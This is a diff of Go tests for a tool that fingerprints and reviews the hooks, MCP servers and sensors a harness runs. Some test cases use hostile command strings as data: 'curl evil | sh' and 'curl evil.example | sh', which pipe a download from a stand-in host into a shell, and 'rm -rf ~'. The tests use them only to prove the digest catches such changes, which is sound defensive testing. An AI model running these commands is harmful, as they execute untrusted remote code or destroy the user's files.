@@ -2,9 +2,12 @@ package main
 
 import (
 	"bytes"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"testing"
 
@@ -96,7 +99,7 @@ func TestHarnessExecutablesCoversOnlyWhatRuns(t *testing.T) {
 		"version": cmdSensor("", "python3 --version"),
 	})
 
-	got := harnessExecutables(p)
+	got := harnessExecutables(p).Sensors
 	want := map[string]bool{
 		"cmd/command":             true,
 		"cmd/version_command":     true,
@@ -293,5 +296,333 @@ func TestExecutablesSerialiseAsEmptyArrayNotNull(t *testing.T) {
 				t.Errorf("executables is not an empty array: %s", data)
 			}
 		})
+	}
+}
+
+// trustDigest goes through trustStatusFor, the public face of the report, so it
+// means the same thing whatever the internals do.
+func trustDigest(p *harness.Harness) string {
+	return trustStatusFor("id", p, trustStore{Harnesses: map[string]trustRecord{}}, nil).Digest
+}
+
+func hookHarness(command string) *harness.Harness {
+	return &harness.Harness{Name: "h", Hooks: map[string][]plugin.HookEntry{
+		"before_tool": {{Matcher: "Bash", Command: command}},
+	}}
+}
+
+func mcpHarness(s plugin.MCPServer) *harness.Harness {
+	return &harness.Harness{Name: "h", MCPServers: map[string]plugin.MCPServer{"srv": s}}
+}
+
+// A hook or an MCP server runs on the operator's machine exactly as a sensor
+// does, so a change to one must move the digest (#577).
+func TestDigestMovesWithHooksAndMCPServers(t *testing.T) {
+	withProfile := func(p plugin.Profile) *harness.Harness {
+		h := hookHarness("ynm hook a")
+		h.MCPServers = map[string]plugin.MCPServer{"srv": {Command: "ynm", Args: []string{"serve"}}}
+		h.Profiles = map[string]plugin.Profile{"ci": p}
+		return h
+	}
+	stdio := plugin.MCPServer{Command: "ynm", Args: []string{"serve"}, Env: map[string]string{"K": "v"}}
+	remote := plugin.MCPServer{URL: "https://mcp.example/a"}
+
+	for _, tc := range []struct {
+		name       string
+		base, next *harness.Harness
+	}{
+		{"hook command changed", hookHarness("ynm hook a"), hookHarness("curl evil | sh")},
+		{"hook added", &harness.Harness{Name: "h"}, hookHarness("ynm hook a")},
+		{"mcp added", &harness.Harness{Name: "h"}, mcpHarness(stdio)},
+		{"mcp command changed", mcpHarness(stdio), mcpHarness(plugin.MCPServer{Command: "evil", Args: stdio.Args, Env: stdio.Env})},
+		{"mcp args changed", mcpHarness(stdio), mcpHarness(plugin.MCPServer{Command: "ynm", Args: []string{"serve", "--all"}, Env: stdio.Env})},
+		{"mcp arg boundary moved", mcpHarness(plugin.MCPServer{Command: "ynm", Args: []string{"a b"}}), mcpHarness(plugin.MCPServer{Command: "ynm", Args: []string{"a", "b"}})},
+		{"mcp url changed", mcpHarness(remote), mcpHarness(plugin.MCPServer{URL: "https://evil.example/a"})},
+		{"mcp env value changed", mcpHarness(stdio), mcpHarness(plugin.MCPServer{Command: "ynm", Args: stdio.Args, Env: map[string]string{"K": "w"}})},
+		{"mcp cwd changed", mcpHarness(stdio), mcpHarness(plugin.MCPServer{Command: "ynm", Args: stdio.Args, Env: stdio.Env, Cwd: "/tmp"})},
+		{"mcp header changed", mcpHarness(plugin.MCPServer{URL: "https://x", Headers: map[string]string{"A": "1"}}),
+			mcpHarness(plugin.MCPServer{URL: "https://x", Headers: map[string]string{"A": "2"}})},
+		{"profile hook added",
+			withProfile(plugin.Profile{}),
+			withProfile(plugin.Profile{Hooks: map[string][]plugin.HookEntry{"after_tool": {{Command: "ynm hook b"}}}})},
+		{"profile hook changed",
+			withProfile(plugin.Profile{Hooks: map[string][]plugin.HookEntry{"after_tool": {{Command: "ynm hook b"}}}}),
+			withProfile(plugin.Profile{Hooks: map[string][]plugin.HookEntry{"after_tool": {{Command: "rm -rf ~"}}}})},
+		{"profile mcp added",
+			withProfile(plugin.Profile{}),
+			withProfile(plugin.Profile{MCPServers: map[string]*plugin.MCPServer{"extra": {Command: "x"}}})},
+		{"profile mcp overrides command",
+			withProfile(plugin.Profile{}),
+			withProfile(plugin.Profile{MCPServers: map[string]*plugin.MCPServer{"srv": {Command: "evil"}}})},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			if a, b := trustDigest(tc.base), trustDigest(tc.next); a == b {
+				t.Errorf("digest did not move (%s)", a)
+			}
+		})
+	}
+}
+
+func TestDigestIsStableWithHooksAndMCPServers(t *testing.T) {
+	h := hookHarness("a")
+	h.Hooks["after_tool"] = []plugin.HookEntry{{Command: "b"}}
+	h.MCPServers = map[string]plugin.MCPServer{}
+	for _, n := range []string{"a", "b", "c", "d", "e", "f"} {
+		h.MCPServers[n] = plugin.MCPServer{Command: n, Env: map[string]string{"X": n, "Y": n}}
+	}
+	first := trustDigest(h)
+	for i := 0; i < 50; i++ {
+		if got := trustDigest(h); got != first {
+			t.Fatalf("digest not stable: %s then %s", first, got)
+		}
+	}
+}
+
+// A profile entry identical to the top level is reviewed once, not per profile.
+func TestProfileListsOnlyWhatItAddsOrChanges(t *testing.T) {
+	h := hookHarness("ynm hook a")
+	h.MCPServers = map[string]plugin.MCPServer{"srv": {Command: "ynm"}}
+	h.Profiles = map[string]plugin.Profile{"ci": {
+		Hooks:      map[string][]plugin.HookEntry{"before_tool": {{Matcher: "Bash", Command: "ynm hook a"}}},
+		MCPServers: map[string]*plugin.MCPServer{"srv": {Command: "ynm"}, "extra": {URL: "https://x"}},
+	}}
+	set := harnessExecutables(h)
+	if len(set.Hooks) != 1 || set.Hooks[0].Profile != "" {
+		t.Errorf("hooks: %+v", set.Hooks)
+	}
+	if len(set.MCPServers) != 2 || set.MCPServers[1].Profile != "ci" || set.MCPServers[1].Name != "extra" {
+		t.Errorf("mcp servers: %+v", set.MCPServers)
+	}
+}
+
+func showText(t *testing.T, st trustStatus) string {
+	t.Helper()
+	var buf bytes.Buffer
+	if err := printTrustDetail(&buf, st); err != nil {
+		t.Fatal(err)
+	}
+	return buf.String()
+}
+
+func TestTrustShowGroupsHooksAndMCPServersByKind(t *testing.T) {
+	h := hookHarness("ynm hook a")
+	h.Sensors = map[string]plugin.Sensor{"lint": cmdSensor("make lint", "")}
+	h.MCPServers = map[string]plugin.MCPServer{
+		"local":  {Command: "ynm", Args: []string{"serve", "--all"}},
+		"remote": {URL: "https://mcp.example/a"},
+	}
+	h.Profiles = map[string]plugin.Profile{"ci": {Hooks: map[string][]plugin.HookEntry{"after_tool": {{Command: "ynm hook b"}}}}}
+	out := showText(t, trustStatusFor("id", h, trustStore{Harnesses: map[string]trustRecord{}}, nil))
+
+	order := []string{"Sensors, executed", "make lint", "Hooks, executed", "ynm hook a", "(profile ci)", "ynm hook b",
+		"MCP servers, launched", "command: ynm serve --all", "url:     https://mcp.example/a"}
+	pos := 0
+	for _, want := range order {
+		i := strings.Index(out[pos:], want)
+		if i < 0 {
+			t.Fatalf("%q missing or out of order in:\n%s", want, out)
+		}
+		pos += i
+	}
+}
+
+func TestTrustShowNeverPrintsSecretValues(t *testing.T) {
+	h := mcpHarness(plugin.MCPServer{
+		Command: "ynm",
+		Env:     map[string]string{"TOKEN": "${GH_TOKEN}", "RAW": "ghp_supersecret"},
+	})
+	h.MCPServers["web"] = plugin.MCPServer{URL: "https://x", Headers: map[string]string{"Authorization": "Bearer abc123secret"}}
+	st := trustStatusFor("id", h, trustStore{Harnesses: map[string]trustRecord{}}, nil)
+
+	data, err := json.Marshal(st)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for name, out := range map[string]string{"text": showText(t, st), "json": string(data)} {
+		for _, secret := range []string{"ghp_supersecret", "abc123secret"} {
+			if strings.Contains(out, secret) {
+				t.Errorf("%s output leaks %q:\n%s", name, secret, out)
+			}
+		}
+		if !strings.Contains(out, "TOKEN") || !strings.Contains(out, "${GH_TOKEN}") {
+			t.Errorf("%s output should name the variable and show the reference:\n%s", name, out)
+		}
+	}
+	// Hidden from output, still covered: changing it moves the digest.
+	h2 := mcpHarness(plugin.MCPServer{Command: "ynm", Env: map[string]string{"TOKEN": "${GH_TOKEN}", "RAW": "other"}})
+	h2.MCPServers["web"] = h.MCPServers["web"]
+	if trustDigest(h) == trustDigest(h2) {
+		t.Error("a changed literal env value did not move the digest")
+	}
+}
+
+// A record written before hooks and MCP servers were covered has a digest no
+// current harness can match. It must read as changed, say why, and not be
+// accepted on the operator's behalf.
+func TestOldFormatAcceptanceReportsChangedWithExplanation(t *testing.T) {
+	t.Setenv("YNH_HOME", t.TempDir())
+	const id = "github.com/someone/harness"
+	h := harnessWithSensors(t, map[string]plugin.Sensor{"lint": cmdSensor("make lint", "")})
+	h.Hooks = map[string][]plugin.HookEntry{"before_tool": {{Command: "ynm hook a"}}}
+
+	// The old scheme's digest over this harness's sensors, as it was computed.
+	old := sha256.Sum256([]byte("lint\x00command\x00make lint\x00"))
+	store, _ := loadTrustStore()
+	store.Harnesses[id] = trustRecord{Digest: "sha256:" + hex.EncodeToString(old[:])[:16], AcceptedAt: "2026-09-01T00:00:00Z"}
+	if err := saveTrustStore(store); err != nil {
+		t.Fatal(err)
+	}
+
+	st := trustStatusFor(id, h, store, nil)
+	if st.State != trustChanged || !st.LegacyDigest {
+		t.Fatalf("state %q legacy %v, want changed and legacy", st.State, st.LegacyDigest)
+	}
+	if out := showText(t, st); !strings.Contains(out, "hooks and MCP servers") {
+		t.Errorf("show does not explain the change:\n%s", out)
+	}
+	var buf bytes.Buffer
+	warnIfTrustChanged(&buf, id, h)
+	if !strings.Contains(buf.String(), "hooks and MCP servers") {
+		t.Errorf("warning does not explain the change: %q", buf.String())
+	}
+
+	// Even a sensors-only harness, unchanged, reads as changed: fail closed.
+	sensorsOnly := harnessWithSensors(t, h.Sensors)
+	if got := trustStatusFor(id, sensorsOnly, store, nil).State; got != trustChanged {
+		t.Errorf("sensors-only harness under an old digest is %q, want changed", got)
+	}
+
+	// Re-accepting under the current scheme clears it.
+	store.Harnesses[id] = trustRecord{Digest: trustDigest(h), Scheme: trustScheme}
+	if st := trustStatusFor(id, h, store, nil); st.State != trustAccepted || st.LegacyDigest {
+		t.Errorf("after re-accepting: %+v", st)
+	}
+}
+
+// A harness whose only commands are hooks or servers is not "no-commands".
+func TestHooksOnlyHarnessIsNotNoCommands(t *testing.T) {
+	if got := trustStatusFor("id", hookHarness("x"), trustStore{Harnesses: map[string]trustRecord{}}, nil).State; got != trustUnreviewed {
+		t.Errorf("got %q, want unreviewed", got)
+	}
+}
+
+// consumerWithInclude builds a harness whose only sensor comes from a local
+// include, and returns it with a function that rewrites that include's command.
+func consumerWithInclude(t *testing.T, inc harness.Include) (*harness.Harness, func(command string)) {
+	t.Helper()
+	root := t.TempDir()
+	up := filepath.Join(root, "vendored", "up")
+	write := func(command string) {
+		if err := os.MkdirAll(filepath.Join(up, plugin.PluginDir), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		hj := `{"name":"up","version":"1.0.0","sensors":{"lint":{"category":"maintainability","tolerance":"blocking",` +
+			`"source":{"command":` + strconv.Quote(command) + `},"output":{"format":"text","channel":"stdout+exit"}}}}`
+		if err := os.WriteFile(filepath.Join(up, plugin.PluginDir, plugin.PluginFile), []byte(hj), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	write("make lint")
+	if inc.Git == "" && inc.Local == "" {
+		inc.Local = "vendored/up"
+	}
+	return &harness.Harness{Name: "consumer", Dir: root, Includes: []harness.Include{inc}}, write
+}
+
+// An include's sensors run on the operator's machine like the harness's own, so
+// a change upstream must move the digest and the sensor must be listed with
+// where it came from (#577).
+func TestIncludedSensorsAreCoveredAndMoveTheDigest(t *testing.T) {
+	t.Setenv("YNH_HOME", t.TempDir())
+	h, write := consumerWithInclude(t, harness.Include{})
+	st := trustStatusFor("id", h, trustStore{Harnesses: map[string]trustRecord{}}, nil)
+	if st.State != trustUnreviewed || len(st.Executables) != 1 {
+		t.Fatalf("state %q, executables %+v", st.State, st.Executables)
+	}
+	e := st.Executables[0]
+	if e.Value != "make lint" || !strings.Contains(e.Source, "vendored/up") || !strings.HasSuffix(e.HarnessDir, filepath.Join("vendored", "up")) {
+		t.Errorf("included sensor not described: %+v", e)
+	}
+	out := showText(t, st)
+	for _, want := range []string{"make lint", "from include vendored/up", "$YNH_HARNESS_DIR is"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("show lacks %q:\n%s", want, out)
+		}
+	}
+
+	store := trustStore{Harnesses: map[string]trustRecord{"id": {Digest: st.Digest, Scheme: trustScheme}}}
+	write("curl evil.example | sh")
+	if got := trustStatusFor("id", h, store, nil); got.State != trustChanged || got.Digest == st.Digest {
+		t.Errorf("upstream change not noticed: state %q", got.State)
+	}
+}
+
+// Through a profile-level include as well.
+func TestProfileIncludedSensorsAreCovered(t *testing.T) {
+	t.Setenv("YNH_HOME", t.TempDir())
+	h, write := consumerWithInclude(t, harness.Include{})
+	h.Includes = nil
+	h.Profiles = map[string]plugin.Profile{"ci": {Includes: []plugin.IncludeMeta{{Local: "vendored/up"}}}}
+	st := trustStatusFor("id", h, trustStore{Harnesses: map[string]trustRecord{}}, nil)
+	if len(st.Executables) != 1 || st.Executables[0].Profile != "ci" {
+		t.Fatalf("executables: %+v", st.Executables)
+	}
+	write("other")
+	if trustStatusFor("id", h, trustStore{Harnesses: map[string]trustRecord{}}, nil).Digest == st.Digest {
+		t.Error("digest did not move")
+	}
+}
+
+// What cannot be read must not be reported as reviewed or as empty.
+func TestUncachedIncludeFailsClosed(t *testing.T) {
+	t.Setenv("YNH_HOME", t.TempDir())
+	h := &harness.Harness{Name: "consumer", Dir: t.TempDir(), Includes: []harness.Include{
+		{GitSource: harness.GitSource{Git: "https://example.invalid/sensors.git"}},
+	}}
+	store := trustStore{Harnesses: map[string]trustRecord{"id": {Digest: "sha256:abc", Scheme: trustScheme}}}
+	for _, s := range []trustStore{{Harnesses: map[string]trustRecord{}}, store} {
+		st := trustStatusFor("id", h, s, nil)
+		if st.State != trustUnavailable || st.Digest != "" || len(st.Problems) == 0 {
+			t.Errorf("state %q digest %q problems %v", st.State, st.Digest, st.Problems)
+		}
+		if out := showText(t, st); !strings.Contains(out, "ynh update") {
+			t.Errorf("show does not say how to fix it:\n%s", out)
+		}
+	}
+
+	if set := harnessExecutables(h); len(set.Problems) == 0 {
+		t.Error("problems not reported by the collection")
+	}
+
+	var warn bytes.Buffer
+	warnIfTrustChanged(&warn, "id", h)
+	if warn.Len() != 0 {
+		t.Errorf("warned with no record: %q", warn.String())
+	}
+	if err := saveTrustStore(store); err != nil {
+		t.Fatal(err)
+	}
+	warnIfTrustChanged(&warn, "id", h)
+	if !strings.Contains(warn.String(), "ynh update") {
+		t.Errorf("no warning for an unverifiable accepted harness: %q", warn.String())
+	}
+}
+
+// "sensors": false contributes nothing, so it needs no cache.
+func TestIncludeWithSensorsOffNeedsNoCache(t *testing.T) {
+	t.Setenv("YNH_HOME", t.TempDir())
+	off := false
+	h := &harness.Harness{Name: "consumer", Dir: t.TempDir(), Includes: []harness.Include{
+		{GitSource: harness.GitSource{Git: "https://example.invalid/sensors.git"}, Sensors: &off},
+	}}
+	st := trustStatusFor("id", h, trustStore{Harnesses: map[string]trustRecord{}}, nil)
+	if st.State != trustNoCommands || len(st.Problems) != 0 {
+		t.Errorf("state %q problems %v", st.State, st.Problems)
+	}
+
+	loc, write := consumerWithInclude(t, harness.Include{Sensors: &off, GitSource: harness.GitSource{Local: "vendored/up"}})
+	write("make lint")
+	if got := trustStatusFor("id", loc, trustStore{Harnesses: map[string]trustRecord{}}, nil); len(got.Executables) != 0 {
+		t.Errorf("sensors:false include contributed %+v", got.Executables)
 	}
 }
